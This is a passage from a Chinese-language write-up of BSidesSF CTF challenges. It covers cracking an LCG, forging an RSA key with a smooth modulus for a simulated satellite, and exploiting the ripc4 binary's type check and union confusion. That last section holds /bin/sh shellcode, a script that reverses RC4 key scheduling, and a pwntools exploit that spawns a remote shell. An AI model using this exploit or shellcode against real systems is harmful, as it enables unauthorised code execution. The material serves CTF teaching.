t4 ≡ t3 * m (mod n) ≡ t1 * m^3 (mod n)
```

此时有：

```
(t2 * t4 - t3 * t3) ≡ [(t1 * m) * (t1 * m^3) - (t1 * m^2) * (t1 * m^2)] (mod n)
                    ≡ [t1^2 * m^4 - t1^2 * m^4] (mod n)
                    ≡ 0 (mod n)
```

将同余式改写为等式，有：

```
(t2 * t4 - t3 * t3) = k * n
```

同理，有：

```
(t3 * t5 - t4 * t4) = g * n
```

此时我们可以认为：

```
n = gcd(k * n, g * n)
```

其中t1到t5均为已知数（可以通过s1到s6的值来计算），即我们最少只需要6个输出即可恢复出n，将上述推导过程写成代码形式如下：

```
def recover_n(s):
    diffs = [s2 - s1 for s1, s2 in zip(s, s[1:])]
    zeroes = [t3 * t1 - t2 * t2 for t1, t2, t3 in zip(diffs, diffs[1:], diffs[2:])]
    n = abs(reduce(gcd, zeroes))
    return n
```

在知道了n后，接下来我们来恢复m，考虑如下同余方程：

```
s2 ≡ s1 * m + c  (mod n)
s3 ≡ s2 * m + c  (mod n)
```

两同余式相减，有：

```
s3 - s2 ≡ (s2 - s1) * m (mod n)
```

此时有：

```
m ≡ (s3 - s2) * (s2 - s1)^(-1) (mod n)
```

从而恢复出了m的值，将上述推导过程写成代码形式如下：

```
def recover_m(s, n):
    m = (s[2] - s[1]) * invert(s[1] - s[0], n) % n
    return m
```

在知道了n、m后，接下来我们恢复c，考虑如下同余方程：

```
s2 ≡ s1 * m + c  (mod n)
```

此时有：

```
c ≡ s2 - (s1 * m) (mod n)
```

从而恢复出了c的值，将上述推导过程写成代码形式如下：

```
def recover_c(s, n, m):
    c = (s[1] - s[0] * m) % n
    return c
```

n、m、c都知道了以后，即可实现预测，首先我们nc连接到服务器，获取一组s1到s6如下：

```
s1 = 661126608579
s2 = 8515847563592
s3 = 27120250862005
s4 = 4169884303818
s5 = 16137464209031
s6 = 3143410817644
```

接下来计算出n、m、c的值：

```
#!/usr/bin/env python

from gmpy2 import *

def recover_n(s):
    diffs = [s2 - s1 for s1, s2 in zip(s, s[1:])]
    zeroes = [t3 * t1 - t2 * t2 for t1, t2, t3 in zip(diffs, diffs[1:], diffs[2:])]
    n = abs(reduce(gcd, zeroes))
    return n

def recover_m(s, n):
    m = (s[2] - s[1]) * invert(s[1] - s[0], n) % n
    return m

def recover_c(s, n, m):
    c = (s[1] - s[0] * m) % n
    return c

s1 = 661126608579
s2 = 8515847563592
s3 = 27120250862005
s4 = 4169884303818
s5 = 16137464209031
s6 = 3143410817644

n = recover_n([s1,s2,s3,s4,s5,s6])
m = recover_m([s1,s2,s3], n)
c = recover_c([s1,s2], n, m)

print (n, m, c)
```

执行代码即可得到n、m、c的值，接下来我们即可开始计算，此时服务器已经生成到s6，因此接下来我们需要计算出s7的值：

```
&gt;&gt;&gt; s7 = (s6 * m + c) % n
&gt;&gt;&gt; s7
mpz(34085312889657)
```

提交至服务器：

```
What number am I thinking of? 34085312889657
Incredible! I WAS thinking of that number! But can you do it again?
What number am I thinking of?
```

可以看到我们预测成功，接下来要求我们再预测出下一个值，采用同样的方法计算出s8：

```
&gt;&gt;&gt; s8 = (s7 * m + c) % n
&gt;&gt;&gt; s8
mpz(41508463105070)
```

提交至服务器，即可得到flag：

```
What number am I thinking of? 41508463105070
You really are the one that was foretold. Please accept this knowldege:
CTF`{`rand_should_be_enough_for_anyone`}`
```



## rsa-debugger

题目描述：<br>
Choose your own keyventure!<br>
rsa-debugger-2ad07dbc.challenges.bsidessf.net:1717

题目只给了一个服务器地址和端口，nc连接上去看一下：

```
Welcome to the Remote Satellite Attack Debugger!

Try "help" for a list of commands
```

输入help查看一下服务器提供了哪些指令：

```
RSA debugger&gt; help
Remote Satellite Attack Debugger help:

Commands:
    help            # Prints this help
    background      # Explain how the attack works
    holdmsg         # Holds a suitable message from being transmitted
    printmsg        # Prints the currently held message
    printtarget     # Prints the target plaintext for currently held msg
    setp &lt;int&gt;      # Set p to the value specified
       e.g. setp 127
    setq &lt;int&gt;      # Set q to the value specified (p must be set)
       e.g. setq 131
    sete &lt;int&gt;      # Set e to the value specified (p &amp; q must be set)
       e.g. sete 17
    printkey        # Prints the current attack key
    resetkey        # Clears all the set key parameters
    testdecrypt     # Locally decrypts held message with current key
    attack          # Send the key and held message to the satellite
    exit            # Exit the hacking interface
```

由于本题没有提供源码，题干也没有交待本题的任务，因此先通过background命令查看一下本题的任务：

```
RSA debugger&gt; background
Remote Satellite Attack Debugger background:

Our agents were able to obtain a working prototype of one of the SATNET
satellites and through extensive reverse engineering uncovered a
debugging interface that has not been disabled. We believe we've
uncovered a vulnerability that will let us take control of a satellite.
If we sent our own messages to the satellite, we'd get caught in the
message audit. Instead, we've found a way to intercept and delay messages
in transmission. By uploading a new key via the debugging interface we
should be able to manipulate how the satellite interprets the message after
the message is decrypted.

The attack:
Using the command `holdmsg` we will begin searching the outbound messages
for a suitable message ciphertext. When a message is found, we can derive
the plaintext that we need the message to decrypt to. You can see the held
message with `printmsg` and the desired plaintext with `printtarget`.

The satellite will accept a new private key with only a few basic checks:
1) p and q must be primes
2) p and q must be co-prime
3) e must be co-prime to the Euler totient of n

Note that we only send the satellite p, q, and e and it derives n and d.

When the right key has been found, use `attack` to upload the new key
and release the held message. The satellite will decrypt the message
with our provided key. If the resulting plaintext contains the target
debugging commands we should gain control of the satellite.
```

阅读可知，题目模拟了一个基于RSA的攻击场景，提炼一下核心思想就是系统负责提供一个m和其对应的c，然后要求用户输入p、q、e，即要求用户提供一组(e, n)，使得`m^e ≡ c(mod n)`。

我们先后输入holdmsg、holdmsg和printtarget命令来获取c和m：

```
RSA debugger&gt; holdmsg
Holding message....found a message to hold!
Target plaintext derived.
RSA debugger&gt; printmsg
Held Message: 26951489564644175456653230687585736580338838263708618013712292080760169510602334072671884866999550794279507424994849685550095276998796745120634736889821620423083634781553271671254728629218239501424892982095333988874656209486912872071578391826065854317309353318501207814096352629564850263810321757236499015621697392699036821960302075744367720697500111447099796190291813031747382152173652243098733466910683611853251467426958183203610956067735023218162106202188255541841009430322439639175156013620160607331664003568894061034095143572434957645944957280890262225298990410953994498755214557585639105202692516734407351686089

RSA debugger&gt; printtarget
Target plaintext for held message: 52218557622655182058721298410128724497736237107858961398752582948746717509543923532995392133766377362569697253085889
```

由于n我们是可以自己设置的，因此如果我们设置这个n后，`m^e ≡ c(mod n)`或`c^d ≡ m(mod n)`中的e/d能直接计算出来，那么这道题就结束了，显然，这里求e/d的过程就是去解决一个离散对数问题，离散对数问题和大整数分解问题一样，并没有一个通用的有效解法，但是在某些特殊情况下可以计算离散对数（正如某些情况下n可以被分解一样），我们的任务就是提供一个n，使得离散对数的求解落入到这类特殊情况中，从而计算出e/d。

对于一个`y = g^x (mod p)`的离散对数问题的场景而言，当群的阶光滑（即p-1有小素因子解）时，可以通过[Pohlig-Hellman算法](https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm)来计算离散对数问题。对于本题来讲，如果我们提供一组(p, q)，使得p和q满足(p-1)和(q-1)光滑，那么接下来可以尝试使用Pohlig-Hellman算法来计算离散对数，但是我们知道，像`m^x ≡ c(mod n)`或`c^x ≡ m(mod n)`这种同余方程，给定一组(m, c, n)来求x并不是一定有解的，因此我们需要调整一下p和q的值使得同余方程尽可能有解。

我们可以考虑原根的存在性，当使得a ^ b ≡ 1 (mod n)成立的最小的b等于phi(n)时，我们称a是模n意义下n的一个原根，数n存在原根的必要条件是n形如1, 2, 4, p^α, 2**p^α，其中p为素数。考虑2**p^α这种情况，我们可以设置q=2, p=满足p-1光滑的一个p，此时n = p*q一定存在原根，但是由于本题中c和m我们不可控，因此约1/2的情况下同余方程无解，我们可以不停尝试n，直到同余方程有解，此时即可计算出离散对数，从而本题可解。

根据上述推导，我们首先假设q=2，然后在SageMath下生成一个满足p-1光滑的p：

```
def gen_vuln_p(nbit):
    while True:
        p = 2
        while p.nbits() &lt; 2048:
            p *= next_prime(randint(0, 10**6))
        p += 1
        if is_prime(p):
            return p

p = gen_vuln_q(2048)
```

得到一个符号条件的p如下：

```
sage: p
69348678866401304646490861340488561209226208451247619560874232340522178522111420961377229336150730880601133592524865851877831525814035741486668086205630811245258303788413634402005343871975262971764271596537208390881585388826538775299782515845855434406453667832544367299838240312836787198396118023980826377214570894061698419474293116477944531505679841702722019141788605828099179561946772093405337285309388291218510467722727587855439951363274502690753768059113924778573772147525576971356709382759100623217498271818843999443100287933304890357765393645527454524195055115747125096835625303998708821171598429576886050671607
```

接下来使用Sage下的discrete_log函数来计算离散对数，discrete_log函数使用Pohlig-Hellman算法和Baby step giant step算法来进行计算：

```
sage: e = discrete_log(Mod(ct,n),Mod(pt,n))
sage: e
36422352138476438909832496849456056084223678523869861209732908151440385123660161504869087755529534644398623699223414430780281764394590301670060005120616912686826197155766762502748616239180854689739776032890835376617273391687494656841086881359810323550417111353865033903912885540415255335166833611689772579230278145479515702771128469846795665013650092070277562327414903956978470113728144176048547997703413968349297818655990813736343030149257242963123900351837101871161825265263358353871479880311787277055886314582993076682661974519235759945922631610206861269106514465703633782653326906936013250902786022123542647753639
```

接下来依次使用setp、setq和sete命令设置p、q、e：

```
RSA debugger&gt; setp 2

RSA debugger&gt; setq 69348678866401304646490861340488561209226208451247619560874232340522178522111420961377229336150730880601133592524865851877831525814035741486668086205630811245258303788413634402005343871975262971764271596537208390881585388826538775299782515845855434406453667832544367299838240312836787198396118023980826377214570894061698419474293116477944531505679841702722019141788605828099179561946772093405337285309388291218510467722727587855439951363274502690753768059113924778573772147525576971356709382759100623217498271818843999443100287933304890357765393645527454524195055115747125096835625303998708821171598429576886050671607

RSA debugger&gt; sete 36422352138476438909832496849456056084223678523869861209732908151440385123660161504869087755529534644398623699223414430780281764394590301670060005120616912686826197155766762502748616239180854689739776032890835376617273391687494656841086881359810323550417111353865033903912885540415255335166833611689772579230278145479515702771128469846795665013650092070277562327414903956978470113728144176048547997703413968349297818655990813736343030149257242963123900351837101871161825265263358353871479880311787277055886314582993076682661974519235759945922631610206861269106514465703633782653326906936013250902786022123542647753639
```

使用printkey命令查看密钥设置情况：

```
RSA debugger&gt; printkey
Current key parameters:
 p: 2
 q: 69348678866401304646490861340488561209226208451247619560874232340522178522111420961377229336150730880601133592524865851877831525814035741486668086205630811245258303788413634402005343871975262971764271596537208390881585388826538775299782515845855434406453667832544367299838240312836787198396118023980826377214570894061698419474293116477944531505679841702722019141788605828099179561946772093405337285309388291218510467722727587855439951363274502690753768059113924778573772147525576971356709382759100623217498271818843999443100287933304890357765393645527454524195055115747125096835625303998708821171598429576886050671607
 derived n: 138697357732802609292981722680977122418452416902495239121748464681044357044222841922754458672301461761202267185049731703755663051628071482973336172411261622490516607576827268804010687743950525943528543193074416781763170777653077550599565031691710868812907335665088734599676480625673574396792236047961652754429141788123396838948586232955889063011359683405444038283577211656198359123893544186810674570618776582437020935445455175710879902726549005381507536118227849557147544295051153942713418765518201246434996543637687998886200575866609780715530787291054909048390110231494250193671250607997417642343196859153772101343214
 e: 36422352138476438909832496849456056084223678523869861209732908151440385123660161504869087755529534644398623699223414430780281764394590301670060005120616912686826197155766762502748616239180854689739776032890835376617273391687494656841086881359810323550417111353865033903912885540415255335166833611689772579230278145479515702771128469846795665013650092070277562327414903956978470113728144176048547997703413968349297818655990813736343030149257242963123900351837101871161825265263358353871479880311787277055886314582993076682661974519235759945922631610206861269106514465703633782653326906936013250902786022123542647753639
 derived d: 11475848161585851629376650407886562187002415489835600751223818333328068256905082663238149764303518192249979414510783083253980314559553095775311658553805767975390498204663534961681184075235339403546359714841235203209540488076625909297051171968846712421948345710805255200457376468164017672950810241674429278554209670559485983713596396455747422052964240878233874195729576610359168370008579693321133791460169576474473764534490140203756337986331651433430663907083311784790492839865895207358760352678805011242690418079655527095574378481710864733615938649622850037212546379720199123669151033788173336550340807463002532173153
```

可以看到参数设置无误，使用testdecrypt命令查看此时解密后的m的值是否和printtarget命令展示的m的值一致：

```
52218557622655182058721298410128724497736237107858961398752582948746717509543923532995392133766377362569697253085889
```

可以看到两处值一致，即我们成功完成了本题的任务，接下来使用attack命令即可得到flag：

```
RSA debugger&gt; attack
Satellite response: CTF`{`curveball_not_just_for_ecc`}`
```



## ripc4

题目描述：<br>[@TODO](https://github.com/TODO) symmetric<br>
ripc4-42d6573e.challenges.bsidessf.net:8267

题目附件：<br>[ripc4](https://github.com/ichunqiu-resources/anquanke/blob/master/009/ripc4/ripc4)<br>[ripc4.c](https://github.com/ichunqiu-resources/anquanke/blob/master/009/ripc4/ripc4.c)

本题给出了服务器的地址和端口，同时给出了服务器端运行着的binary及其源码，该binary提供了三组模式，分别是明文模式、编码模式和加密模式：

```
type (plain, encoded, encrypted)&gt;
```

每个模式提供的命令如下：

```
#plain
type (plain, encoded, encrypted)&gt; plain

set_input   : Set the input value
print       : Print the output value
quit        : Quit the Program

command&gt;

#encoded
type (plain, encoded, encrypted)&gt; encoded

set_input   : Set the input value
print       : Print the output value
set_encoding: Set the encoding scheme.
quit        : Quit the Program

command&gt;

#encrypted
type (plain, encoded, encrypted)&gt; encrypted

set_input   : Set the input value
set_key     : Set the RC4 key.
encrypt     : Perform encryption.
quit        : Quit the Program

command&gt;
```

其中编码模式可以选择使用base64或hex方式进行编码，加密模式会使用RC4进行加密，可以看到明文模式和编码模式的界面都显示了print命令，但encrypted模式没有，但是审计源码我们可以发现程序在判断用户输入的命令是print后并没有继续判断当前处于什么模式，因此我们在加密模式下仍然可以执行print命令，print命令会调用print_state函数，我们来看一下该函数：

```
void print_state(workspace_t *ws) `{`
  if (CHECK_TYPE(ws, TYPE_ENCODE)) `{`
    if (!ws-&gt;print_encoded) `{`
      printf("Must use set_encoding first.n");
      return;
    `}`
    ws-&gt;print_encoded(ws-&gt;input_buf, ws-&gt;buf_len);
  `}` else if (CHECK_TYPE(ws, TYPE_PLAIN)) `{`
    printf("%sn", ws-&gt;input_buf);
  `}` else `{`
    printf("Printing not supported for encrypted data.n");
  `}`
`}`
```

print_state函数首先会试图通过CHECK_TYPE(ws, TYPE_ENCODE)来判断当前是否处于编码模式，但是这里存在一个问题，我们查看一下CHECK_TYPE的宏定义：

```
#define CHECK_TYPE(ws, t) ((ws-&gt;type &amp; t) == t)
```

可以看到它是根据((ws-&gt;type &amp; t) == t)的结果来判断当前所处的模式，这里程序的三种模式的宏定义如下：

```
#define TYPE_PLAIN 1
#define TYPE_ENCODE 2
#define TYPE_ENCRYPT 3
```

那么当我们选择加密模式后，ws-&gt;type会被设置为3，print_state函数在使用CHECK_TYPE(ws, TYPE_ENCODE)时，会计算3&amp;2是否等于2，而显然这里是相等的，因此我们在加密模式下调用print_state函数时会进入到第一个编码模式为True的分支中。我们继续来看一下，进入到该分支之后，程序会判断!ws-&gt;print_encoded是否为True，即ws-&gt;print_encoded是否被设置了内容，如果没有被设置过的话程序就会打印提示语句并退出，但是我们审计代码会发现，ws-&gt;print_encoded只在set_encoding中被设置过，但是set_encoding需要在编码模式下才能调用，我们现在是在加密模式，因此我们需要想办法寻找其他方式来设置ws-&gt;print_encoded。

由于ws是workspace_t结构体变量，我们回到workspace_t结构体本身来看一下：

```
typedef struct `{`
  int type;
  char *input_buf;
  size_t buf_len;
  union `{`
    void (*print_encoded)(const char *, size_t);
    char *enc_state;
  `}`;
`}` workspace_t;
```

可以看到print_encoded函数和enc_state是写在联合体union当中的，由于union当中几个不同类型的变量共占一段内存，因此会出现相互覆盖的问题，即如果我们设置了enc_state，同样能过掉!ws-&gt;print_encoded这一check，这样一来，在ws-&gt;print_encoded(ws-&gt;input_buf, ws-&gt;buf_len)时，程序就会跳到states处执行，因此如果我们可以将256字节的states设置为shellcode，就可以在加密模式下执行print命令来执行shellcode，因此我们接下来查看一下如何设置enc_state。

审计代码可知set_key函数可以设置enc_state，set_key函数首先调用secure_malloc函数来为enc_state分配256字节的空间，我们查看secure_malloc函数可以发现函数以PROT_RW方式分配存储页，而PROT_RW在宏定义处设置为(PROT_MASK|PROT_READ|PROT_WRITE)，而PROT_MASK又设置为(PROT_READ|PROT_WRITE|PROT_EXEC)，即我们分配的页面是可写、可读可执行的。

分配完空间后接下来对enc_state进行初始化，在set_key函数中我们可以看到RC4的states在初始化时是对256个字节依次赋值x00到xff，随后该states只经历了置换运算，没有经历代换运算，因此states中的256个字节是互不相同的，也就意味着我们的shellcode中的每个字节只能出现一次。但是我们这里想要执行shellcode的话，’/bin/sh’中包含了两个’/‘，出现了相同字节，所以我们需要调整一下shellcode（当然也可以采用多级shellcode的方式）：

```
00000000  31F6              xor esi,esi
00000002  56                push esi
00000003  48                dec eax
00000004  BB2E62696E        mov ebx,0x6e69622e
00000009  2F                das
0000000A  7368              jnc 0x74
0000000C  0080CB015354      add [eax+0x545301cb],al
00000012  5F                pop edi
00000013  F7EE              imul esi
00000015  B03B              mov al,0x3b
00000017  0F05              syscall
```

由于我们输入的内容是key，因此我们可以写一个脚本来计算一下，当输入什么样的key时，程序中的states会恰好变成我们构造的shellcode。

我们从RC4的密钥调度部分入手，RC4的密钥调度算法如下：

```
def key_scheduling(key):
    j = 0
    state = range(256)
    for i in range(256):
        j = (j + state[i] + key[i % 256]) &amp; 0xff
        state[i], state[j] = state[j], state[i]
    return state
```

根据该算法我们可以写出该算法的逆算法：

```
def reverse_key_scheduling(state):
    init = range(256)
    key = []
    j = 0
    for i in range(256):
        idx = init.index(state[i])
        last_j = j
        key.append((idx + 1024 - j - init[i]) &amp; 0xff)
        j = idx &amp; 0xff
        assert (last_j + init[i] + key[-1] &amp; 0xff == j)
        init[i], init[j] = init[j], init[i]
    return key
```

根据该逆算法我们可以写出由shellcode（即state）求key的脚本如下：

```
#!/usr/bin/env python

import random
from Crypto.Util.number import *

def reverse_key_scheduling(state):
    init = range(256)
    key = []
    j = 0
    for i in range(256):
        idx = init.index(state[i])
        last_j = j
        key.append((idx + 1024 - j - init[i]) &amp; 0xff)
        j = idx &amp; 0xff
        assert (last_j + init[i] + key[-1] &amp; 0xff == j)
        init[i], init[j] = init[j], init[i]
    return key

state = range(256)

shellcode = '31f65648bb2e62696e2f73680080cb0153545ff7eeb03b0f05'
shellcode = map(bytes_to_long, list(shellcode.decode('hex')))

for i in shellcode:
   state.remove(i)

random.shuffle(state)
state = shellcode + state

key = reverse_key_scheduling(state)
print ''.join([i.replace('0x', '').zfill(2) for i in (map(hex, key))])
```

有了key之后，我们可以写exp如下：

```
from pwn import *

r = remote('ripc4-42d6573e.challenges.bsidessf.net', 8267)

#使用上面的脚本所生成的一个key
key = '31c45eef6f6e2e00fdb83aeabd423d1c4df0f985e3ad75a42061ab2dc00fdc78257114ee0a035e1984590f2a0ab64f9d5156679b4d0cb0f9017ad0f88142a2a5f988d1e6a7e7810cb6f8d8a86df1cbb9ca57f30377ab49812a6960d7391ee0a517a0dfb79232cd18d196a89d9abc497abd68e4fc571eea6fd664aa47a1dd99b1c69601806034e829437ea985bf4e9216b30315207a6911636c83a07b736eb8688b56310054993160b9bcabc82a6d37d9188b6823bb9f9886ee3477956923c8fa2249603d746a25569db2bc89423fb7767494b7c92ac92c5c9699a1be4eceb618b7ea1b40445ee7ae0ce0b7c2e4175bcbc817301fb7bfe62c1c5f5f412a2d2d2c'

r.sendline('encrypted')
r.sendline('set_key')
r.sendline(key)
r.sendline('print')
r.interactive()
```

执行exp即可拿到shell，从而得到flag：

```
CTF`{`R.I.P_RC4_u_were_fun_while_it_lasted`}`
```



## 参考

[https://docs.microsoft.com/en-us/windows/win32/seccrypto/example-c-program–importing-a-plaintext-key](https://docs.microsoft.com/en-us/windows/win32/seccrypto/example-c-program--importing-a-plaintext-key)<br>[http://www.ai.mit.edu/courses/6.836-s03/handouts/sierra/random.c](http://www.ai.mit.edu/courses/6.836-s03/handouts/sierra/random.c)<br>[https://hal.archives-ouvertes.fr/hal-02182827/document](https://hal.archives-ouvertes.fr/hal-02182827/document)<br>[https://en.wikipedia.org/wiki/Scalable_Vector_Graphics](https://en.wikipedia.org/wiki/Scalable_Vector_Graphics)<br>[https://en.wikipedia.org/wiki/Chaffing_and_winnowing](https://en.wikipedia.org/wiki/Chaffing_and_winnowing)<br>[https://tailcall.net/blog/cracking-randomness-lcgs/](https://tailcall.net/blog/cracking-randomness-lcgs/)<br>[https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm](https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm)<br>[https://en.wikipedia.org/wiki/Primitive_root_modulo_n](https://en.wikipedia.org/wiki/Primitive_root_modulo_n)
